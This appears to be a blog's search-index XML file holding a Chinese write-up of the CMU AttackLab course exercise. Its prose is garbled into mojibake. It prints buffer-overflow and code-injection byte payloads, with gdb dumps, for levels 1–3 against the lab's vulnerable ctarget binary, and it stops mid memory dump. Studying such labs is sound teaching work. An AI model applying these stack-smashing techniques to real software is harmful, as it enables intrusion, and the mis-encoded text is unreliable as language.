<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>AttackLab</title>
    <link href="/2024/08/16/AttackLab/"/>
    <url>/2024/08/16/AttackLab/</url>
    
    <content type="html"><![CDATA[<h1 id="AttackLab"><a href="#AttackLab" class="headerlink" title="AttackLab"></a>AttackLab</h1><h2 id="Labæ¦‚è¿°ï¼š"><a href="#Labæ¦‚è¿°ï¼š" class="headerlink" title="Labæ¦‚è¿°ï¼š"></a>Labæ¦‚è¿°ï¼š</h2><p>å­¦ç”Ÿä»¬å°†è·å¾—åä¸º<code> ctarget</code> å’Œ <code>rtarget</code> çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚ä»–ä»¬è¢«è¦æ±‚é€šè¿‡äº”ç§æ—¥ç›Šå¤æ‚çš„æ”»å‡»æ¥æ”¹å˜ç›®æ ‡çš„è¡Œä¸ºã€‚å¯¹ <code>ctarget</code> çš„ä¸‰ç§æ”»å‡»ä½¿ç”¨ä»£ç æ³¨å…¥ã€‚å¯¹ <code>rtarget</code> çš„ä¸¤ç§æ”»å‡»ä½¿ç”¨é¢å‘è¿”å›ç¼–ç¨‹ã€‚å®éªŒå®¤æä¾›ä»¥ä¸‹èµ„æºï¼š</p><ol><li>**<code>ctarget</code>**ï¼šä¸€ä¸ªå…·æœ‰ä»£ç æ³¨å…¥æ¼æ´çš„ Linux äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç”¨äºç¬¬ 1-3 é˜¶æ®µçš„å®éªŒã€‚</li><li>**<code>rtarget</code>**ï¼šä¸€ä¸ªå…·æœ‰ ROP æ¼æ´çš„ Linux äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç”¨äºç¬¬ 4-5 é˜¶æ®µçš„å®éªŒã€‚</li><li>**<code>cookie.txt</code>**ï¼šåŒ…å«æœ¬å®éªŒå®¤å®ä¾‹æ‰€éœ€çš„ 4 å­—èŠ‚ç­¾åã€‚</li><li>**<code>farm.c</code>**ï¼šåŒ…å« <code>rtarget</code> ä¸­ä½¿ç”¨çš„å°å·¥å…·çš„æºä»£ç ï¼Œä¾›å­¦ç”Ÿç¼–è¯‘å’Œåæ±‡ç¼–ä»¥å¯»æ‰¾æ”»å‡»æ‰€éœ€çš„å·¥å…·ã€‚ </li><li>**<code>hex2raw</code>**ï¼šä¸€ä¸ªå®ç”¨ç¨‹åºï¼Œç”¨äºç”Ÿæˆå­—èŠ‚åºåˆ—ï¼Œå¸®åŠ©å­¦ç”Ÿåœ¨å®éªŒä¸­æ›´å®¹æ˜“åœ°æ“ä½œå’Œæ³¨å…¥ä»£ç ã€‚</li></ol><p><strong>äºŒè¿›åˆ¶æ–‡ä»¶ï¼š</strong></p><p><code>ctarget</code>å’Œ<code>rtarget</code>éƒ½é€šè¿‡å‡½æ•°<code>getbuf</code>æ¥æ¥å—è¾“å…¥å­—ç¬¦ä¸²ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-title function_">getbuf</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[BUFFER_SIZE];<br>    Gets(buf);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”±äºå‡½æ•°<code>Gets()</code>ä¸èƒ½ç¡®å®šç¼“å†²åŒºå¤§å°æ˜¯å¦è¶³ä»¥å‚¨å­˜<code>buf</code>å­—ç¬¦ä¸²ï¼Œå› æ­¤å¯èƒ½å¯¼è‡´ç¼“å†²åŒºæº¢å‡ºçš„é—®é¢˜ã€‚</p><p>å½“é”®å…¥çš„å­—ç¬¦ä¸²è¶³å¤ŸçŸ­æ—¶ï¼Œ<code>ctarget</code>ä¼šè¿”å›1,åä¹‹ä¼šæŠ¥é”™.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Cookie: 0x1a7dd803<br>Type string: Keep it short!<br>No exploit. Getbuf returned 0x1<br>Normal <span class="hljs-built_in">return</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">unix&gt; ./ctarget<br>Cookie: 0x1a7dd803<br>Type string: This is not a very interesting string, but it has the property ...<br>Ouch!: You caused a segmentation fault!<br>Better luck next time<br></code></pre></td></tr></table></figure><p><strong>HEX2RAWï¼š</strong></p><p>HEX2RAW å°†åå…­è¿›åˆ¶æ ¼å¼çš„å­—ç¬¦ä¸²ä½œä¸ºè¾“å…¥ã€‚åœ¨æ­¤æ ¼å¼ä¸­ï¼Œæ¯ä¸ªå­—èŠ‚å€¼ç”±ä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—è¡¨ç¤ºã€‚ä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²â€œ012345â€å¯ä»¥ä»¥åå…­è¿›åˆ¶æ ¼å¼è¾“å…¥â€œ30 31 32 33 34 35 00â€ã€‚ä¼ é€’ç»™ HEX2RAW çš„åå…­è¿›åˆ¶å­—ç¬¦åº”ä»¥ç©ºæ ¼ï¼ˆç©ºæ ¼æˆ–æ¢è¡Œç¬¦ï¼‰åˆ†éš”ã€‚</p><p><strong>ç”Ÿæˆå­—èŠ‚ä»£ç ï¼š</strong></p><p>ä½¿ç”¨GCCä½œä¸ºæ±‡ç¼–å™¨ï¼Œä½¿ç”¨OBJDUMPä½œä¸ºåæ±‡ç¼–å™¨ï¼Œå¯ä»¥æ–¹ä¾¿åœ°ç”ŸæˆæŒ‡ä»¤åºåˆ—çš„å­—èŠ‚ç ã€‚</p><p>æ±‡ç¼–å’Œåæ±‡ç¼–æ“ä½œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">unix&gt; gcc -c example.s<br>unix&gt; objdump -d example.o &gt; example.d<br></code></pre></td></tr></table></figure><h2 id="Part-I-Code-Injection-Attacks"><a href="#Part-I-Code-Injection-Attacks" class="headerlink" title="Part I: Code Injection Attacks"></a>Part I: Code Injection Attacks</h2><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>åœ¨è¿™ä¸€éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬ä¸éœ€è¦åŠ å…¥æ–°ä»£ç ï¼Œåªéœ€è¦åˆ©ç”¨å­—ç¬¦ä¸²é‡å®šå‘ç¨‹åºä»¥æ‰§è¡Œç°æœ‰è¿‡ç¨‹ã€‚</p><p>åœ¨æ–‡ä»¶<code>ctarget</code>ä¸­ï¼Œ<code>getbuf</code>å‡½æ•°æœ‰ä»¥ä¸‹çš„è°ƒç”¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> val;<br>val = getbuf();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒæ—¶å­˜åœ¨ä¸€ä¸ªå‡½æ•°touch1ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">touch1</span><span class="hljs-params">()</span><br>&#123;<br>    vlevel = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch1 !: You called touch1()\n&quot;</span>);<br>    validate(<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨æ‰§è¡Œ<code>getbuf</code>åï¼ŒPCä¼šè¿”å›åˆ°<code>test</code>å‡½æ•°ä¸­ã€‚æˆ‘ä»¬æƒ³è®©<code>getbuf</code> æ‰§è¡Œå…¶ return è¯­å¥æ—¶æ‰§è¡Œ<code>touch1</code>çš„ä»£ç ï¼Œè€Œä¸æ˜¯è¿”å›åˆ°<code> test</code>ã€‚</p><p>å› æ­¤ï¼Œæˆ‘ä»¬çš„æ€è·¯ä¾¿å¾ˆæ¸…æ™°äº†ï¼šæ‰¾åˆ°<code>getbuf()</code>å‡½æ•°å¯¹åº”çš„æ±‡ç¼–ä»£ç ï¼Œåœ¨æ‰§è¡Œ<code>ret</code>æŒ‡ä»¤ä¹‹å‰è·³è½¬åˆ°<code>touch1()</code>å³å¯ã€‚</p><p>æ‰“æ–­ç‚¹å¹¶ä¸”åæ±‡ç¼–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function getbuf:<br>   0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp<br>   0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi<br>   0x00000000004017af &lt;+7&gt;:     call   0x401a40 &lt;Gets&gt;<br>   0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax<br>   0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp<br>   0x00000000004017bd &lt;+21&gt;:    ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>æ³¨æ„åˆ°åˆ†é…äº†0x28&#x3D;40ä¸ªå­—èŠ‚å¤§å°çš„ç©ºé—´ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦å…ˆå¡«å……40å­—èŠ‚çš„æ— æ•ˆå­—èŠ‚ï¼Œå†å°†ä»£ç æ³¨å…¥åˆ°åå‡ ä¸ªå­—èŠ‚è¦†ç›–æ‰æ ˆå¸§ä¸­å‹å…¥çš„testå‡½æ•°çš„åœ°å€å³å¯ã€‚</p><p>åŒæ—¶æ‰¾åˆ°å‡½æ•°<code>touch1()</code>çš„å…¥å£åœ°å€ï¼š0x00000000004017c0</p><p>ä¾æ®å°ç«¯æ³•ï¼Œæˆ‘ä»¬åœ¨æœ€åå¡«å…¥c0 17 40ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥è¾“å…¥ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">00 00 00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00 00 00<br>c0 17 40 00<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†å…¶å­˜å…¥ä¸€ä¸ªtxtæ–‡ä»¶ä¸­ï¼Œåˆ©ç”¨<strong>HEX2RAW</strong>è½¬æ¢åè¾“å…¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./hex2raw &lt; level1.txt &gt; ans1.txt<br>./ctarget -i ans1.txt -q<br></code></pre></td></tr></table></figure><p>é€šè¿‡æµ‹è¯•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Cookie: 0x59b997fa<br>Touch1!: You called touch1()<br>Valid solution <span class="hljs-keyword">for</span> level 1 with target ctarget<br>PASS: Would have posted the following:<br>        user <span class="hljs-built_in">id</span> bovik<br>        course  15213-f15<br>        lab     attacklab<br>        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40<br></code></pre></td></tr></table></figure><h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>åœ¨<code>ctarget</code>ä¸­ï¼Œæœ‰ä¸€ä¸ª<code>touch2()</code>å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">touch2</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> val)</span><br>&#123;<br>    vlevel = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (val == cookie)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch2!:You called touch2(0x%.8x)\n&quot;</span>, val);<br>        validate(<span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        fail(<span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨è¿™ä¸€é˜¶æ®µéœ€è¦åšçš„ä¾¿æ˜¯åˆ©ç”¨<code>getbuf</code>è°ƒç”¨<code>touch2</code>ï¼Œä½†ä¸åŒçš„æ˜¯è¿™æ¬¡æˆ‘ä»¬éœ€è¦ä¼ é€’ä¸€ä¸ªå‚æ•°<code>val</code>ã€‚å¾—åˆ°å‡½æ•°åœ°å€ä¸º0x00000000004017ecã€‚</p><p>è€Œå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å‚¨å­˜åœ¨å¯„å­˜å™¨<code>%rdi</code>ä¸­ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å…ˆå°†cookieå€¼ï¼ˆæ­¤å¤„ä¸º0x59b997faï¼‰ä¼ åˆ°<code>%rdi</code>ä¸­ï¼Œå†è°ƒç”¨<code>touch2</code>ï¼Œæ±‡ç¼–ä»£ç çœ‹èµ·æ¥æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq$0x59b997fa,%rdi<br>calltouch2<br></code></pre></td></tr></table></figure><p>ä½†æ ¹æ®è¦æ±‚ä¸ä½¿ç”¨<code>call</code>å’Œ<code>jmp</code>æŒ‡ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨<code>ret</code>æŒ‡ä»¤æ¥ä»£æ›¿ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq$0x59b997fa,%rdi<br>pushq$0x4017ec<br>retq<br></code></pre></td></tr></table></figure><p>å°†è¿™æ®µä»£ç è¿›è¡Œæ±‡ç¼–ï¼Œå†åæ±‡ç¼–ä¸ºå­—èŠ‚ç ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -c level2.s<br>objdump -d level2.o &gt; level2.byte<br></code></pre></td></tr></table></figure><p>å¾—åˆ°å­—èŠ‚ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">level2.o:     file format elf64-x86-64<br><br>Disassembly of section .text:<br><br>0000000000000000 &lt;.text&gt;:<br>   0:48 c7 c7 fa 97 b9 59 mov    $0x59b997fa,%rdi<br>   7:68 ec 17 40 00       push   $0x4017ec<br>   c:c3                   ret    <br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¾¿å¾—åˆ°äº†æ³¨å…¥çš„å­—èŠ‚ç ï¼Œè¿™äº›å­—èŠ‚ç ä¼šéšç€è¯»å–æ“ä½œè€Œè¿›å…¥æ•°ç»„<code>buf</code>ä¸­ã€‚ä¸‹ä¸€æ­¥ä¾¿æ˜¯è®©ç¨‹åºè®¡æ•°å™¨<code>%rip</code>è·³è½¬åˆ°<code>buf</code>çš„èµ·å§‹ä½ç½®æ‰§è¡Œæ³¨å…¥çš„ä»£ç ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç¡®å®šç¼“å†²åŒºçš„èµ·å§‹ä½ç½®ã€‚è¿™é‡Œæˆ‘ä»¬å®é™…è·‘ä¸€ä¸‹ä»£ç ï¼Œç­‰å¾…ç¼“å†²åŒºè®¾å®šå®Œæˆåæ£€æŸ¥<code>%rsp</code>å¾—åˆ°ç¼“å†²åŒºèµ·å§‹ä½ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function getbuf:<br>   0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp<br>=&gt; 0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi<br>   0x00000000004017af &lt;+7&gt;:     call   0x401a40 &lt;Gets&gt;<br>   0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax<br>   0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp<br>   0x00000000004017bd &lt;+21&gt;:    ret<br>End of assembler dump.<br>(gdb) info registers<br>rax            0x0                 0<br>rbx            0x55586000          1431855104<br>rcx            0x0                 0<br>rdx            0x5561dcc0          1432476864<br>rsi            0xf4                244<br>rdi            0x55685fd0          1432903632<br>rbp            0x55685fe8          0x55685fe8<br>rsp            0x5561dc78          0x5561dc78<br></code></pre></td></tr></table></figure><p>å¯çŸ¥ç¼“å†²åŒºèµ·å§‹åœ°å€ä¸º0x5561dc78 </p><p>æˆ‘ä»¬ç»„è£…ä¸€ä¸‹å­—èŠ‚ç ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">48</span> c7 c7 fa <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <br><span class="hljs-attribute">68</span> ec <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">c3</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span><br></code></pre></td></tr></table></figure><p>ç»æ£€æŸ¥æ— è¯¯ã€‚</p><h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>level 3æ¶‰åŠä¸¤ä¸ªå‡½æ•°ï¼š<code>hexmatch</code> å’Œ <code>touch3</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">hexmatch</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> val, <span class="hljs-type">char</span> *sval)</span><br>&#123;<br><span class="hljs-type">char</span> cbuf[<span class="hljs-number">110</span>];<br><span class="hljs-comment">/* Make position of check string unpredictable */</span><br><span class="hljs-type">char</span> *s = cbuf + random() % <span class="hljs-number">100</span>;<br><span class="hljs-built_in">sprintf</span>(s, <span class="hljs-string">&quot;%.8x&quot;</span>, val);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">strncmp</span>(sval, s, <span class="hljs-number">9</span>) == <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">touch3</span><span class="hljs-params">(<span class="hljs-type">char</span> *sval)</span><br>&#123;<br> vlevel = <span class="hljs-number">3</span>; <span class="hljs-comment">/* Part of validation protocol */</span><br><span class="hljs-keyword">if</span> (hexmatch(cookie, sval)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);<br>validate(<span class="hljs-number">3</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);<br>fail(<span class="hljs-number">3</span>);<br>&#125;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬è¿™æ¬¡ä¸ä»…éœ€è¦ä¼ é€’å‚æ•°<code>val=cookie</code>ï¼ŒåŒæ—¶è¿˜éœ€è¦ä¼ é€’ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°<code>sval</code>ã€‚</p><p><code>char *s = cbuf + random() % 100</code>ï¼šéšæœºæŒ‡å®š<code>s</code>åœ¨<code>cbuf</code>ä¸­çš„èµ·å§‹ä½ç½®ã€‚</p><p><code>sprintf(s, &quot;%.8x&quot;, val);</code>ï¼šä½¿ç”¨ <code>sprintf</code> å‡½æ•°å°†æ— ç¬¦å·æ•´æ•° <code>val(cookie=0x59b997fa)</code> è½¬æ¢æˆä¸€ä¸ª 8 ä½çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå­˜å‚¨åœ¨æŒ‡é’ˆ <code>s</code> æ‰€æŒ‡å‘çš„ä½ç½®ã€‚</p><p><code>return strncmp(sval, s, 9) == 0;</code>ï¼šä½¿ç”¨ <code>strncmp</code> å‡½æ•°æ¯”è¾ƒ <code>sval</code> å’Œ <code>s</code> æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²çš„å‰ 9 ä¸ªå­—ç¬¦å®Œå…¨ç›¸åŒï¼Œåˆ™è¿”å› <code>1</code>ï¼Œå¦åˆ™è¿”å› <code>0</code>ã€‚</p><p>ç”±äº<code>hexmatch</code>å‡½æ•°è‡ªèº«ç”³è¯·äº†110å­—èŠ‚ç©ºé—´ï¼Œå¹¶ä¸”è°ƒç”¨äº†å…¶å®ƒåº“å‡½æ•°ï¼ˆä¸€èˆ¬æ‰€éœ€å†…å­˜è¾ƒå¤§ï¼‰ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æ³¨æ„åˆ°è¿™äº›æ“ä½œéƒ½ä¼šè¦†ç›–æˆ‘ä»¬åŸæ¥<code>getbuf</code>ç”³è¯·çš„æ ˆç©ºé—´ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è€ƒè™‘å°†æ³¨å…¥çš„ä»£ç å­˜æ”¾åœ¨å…¶å®ƒä¸ä¼šè¢«è¦†ç›–çš„åœ°æ–¹ã€‚</p><p>å¯¹åº”ASCIIç ï¼Œæˆ‘ä»¬é¦–å…ˆå°†cookieç¿»è¯‘ä¸ºå­—ç¬¦ä¸²ï¼š59b997fa &#x3D;&gt; 35 39 62 39 39 37 66 61</p><p>ç„¶åè€ƒè™‘æ³¨å…¥ä»£ç çš„é€»è¾‘ï¼Œä¸level 2ç±»ä¼¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pushq$0x4018fa<br>movq$0x000000,%rdi;è¿™é‡Œè¿™ä¸ªç«‹å³æ•°åº”å½“ä¸ºå­˜æ”¾å­—èŠ‚ä»£ç çš„åœ°å€ï¼Œæš‚å®š<br>retq<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å…ˆå°†å­—ç¬¦ä¸²ä¿å­˜åœ¨<code>%rsp+8</code>å¤„çœ‹çœ‹æƒ…å†µå¦‚ä½•ï¼ˆè¿™é‡Œè¿™ä¹ˆé€‰çš„åŸå› æ˜¯ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function touch3:<br>=&gt; 0x00000000004018fa &lt;+0&gt;:     push   %rbx<br>   0x00000000004018fb &lt;+1&gt;:     mov    %rdi,%rbx<br>   0x00000000004018fe &lt;+4&gt;:     movl   $0x3,0x202bd4(%rip)       <br>   0x0000000000401908 &lt;+14&gt;:    mov    %rdi,%rsi<br>   0x000000000040190b &lt;+17&gt;:    mov    0x202bd3(%rip),%edi        <br>   0x0000000000401911 &lt;+23&gt;:    call   0x40184c &lt;hexmatch&gt;<br>   0x0000000000401916 &lt;+28&gt;:    test   %eax,%eax<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨<code>0x40184c</code>è°ƒç”¨äº†å‡½æ•°<code>hexmatch</code>ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨å‰åæ‰“æ–­ç‚¹ï¼Œæ£€æµ‹æ ˆ<code>0x5561dc78 </code>å¼€å§‹çš„åœ°å€å³å¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) x/20x 0x5561dc78<br>0x5561dc78:     0x4018fa68      0x7c8d4800      0xefc30824      0xefefefef<br>0x5561dc88:     0xefefefef      0xefefefef      0xefefefef      0xefefefef<br>0x5561dc98:     0xefefefef      0xefefefef      0x55586000      0x00000000<br>0x5561dca8:     0x39623935      0x61663739      0x00400000      0x00000000<br>0x5561dcb8:     0x00000000      0x00000000      0xf4f4f4f4      0xf4f4f4f4<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨<code>0x5561dca8</code>åé¢å­˜æ”¾çš„8ä¸ªå­—èŠ‚å°±æ˜¯æˆ‘ä»¬çš„cookieå­—ç¬¦ä¸²ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) x/20x 0x5561dc78<br>0x5561dc78:     0x9b3b8d00      0xf82d828c      0x5561dca8      0x00000000<br>0x5561dc88:     0x55685fe8      0x00000000      0x00000004      0x00000000<br>0x5561dc98:     0x00401916      0x00000000      0x55586000      0x00000000<br>0x5561dca8:     0x39623935      